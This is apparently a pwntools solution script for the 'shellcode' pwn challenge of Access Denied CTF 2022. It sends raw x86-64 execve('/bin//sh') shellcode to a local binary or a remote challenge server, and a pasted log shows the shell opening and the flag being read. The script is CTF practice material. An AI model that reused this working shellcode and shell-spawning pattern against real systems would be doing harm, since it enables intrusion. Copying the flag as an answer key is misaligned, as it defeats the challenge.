from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './shellcode'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "34.134.85.196"
  PORT = 5337
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

shellcode = '\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05'

s.recvuntil("code below\n")

s.sendline(shellcode)

s.interactive()

'''
mito@ubuntu:~/CTF/Access_Denied_CTF_2022/Pwn_shellcode/shellcode$ python solve.py r
[*] '/home/mito/CTF/Access_Denied_CTF_2022/Pwn_shellcode/shellcode/shellcode'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Opening connection to 34.134.85.196 on port 5337: Done
[*] Switching to interactive mode
$ id
/bin//sh: 1: id: not found
$ ls -l
total 48
drwxr-x--- 1 0 1000  4096 Jun  9 02:09 bin
drwxr-x--- 1 0 1000  4096 Jun  9 02:09 dev
-rwxr----- 1 0 1000    64 Jun  9 02:10 flag.txt
drwxr-x--- 1 0 1000  4096 Jun  9 02:08 lib
drwxr-x--- 1 0 1000  4096 Jun  9 02:08 lib32
drwxr-x--- 1 0 1000  4096 Jun  9 02:08 lib64
drwxr-x--- 1 0 1000  4096 Jun  9 02:08 libx32
-rwxr-x--- 1 0 1000 19392 Jun  8 05:49 shellcode
$ cat flag.txt
accessdenied{3x3cut3d_x64_sh3ll_0v3rfl0w_5ucc3ssfully_611a1501}
'''
